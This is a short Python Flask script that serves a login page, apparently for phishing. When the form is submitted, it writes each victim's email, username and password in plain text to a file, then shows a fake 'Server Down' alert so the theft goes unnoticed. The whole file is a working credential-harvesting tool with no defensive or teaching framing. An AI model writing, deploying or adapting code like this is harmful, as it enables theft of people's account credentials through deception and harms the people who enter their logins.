from flask import Flask, render_template, request
app = Flask(__name__)
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form["email"]
        username = request.form["username"]
        password = request.form["password"]
        with open("logins.txt", "a") as file:
            file.write(f"Email: {email}, Username: {username}, Password: {password}\n")
        return '<script>alert("Server Down! Try again later."); window.location="/";</script>'
    return render_template("login.html")
if __name__ == "__main__":
    app.run(debug=True)
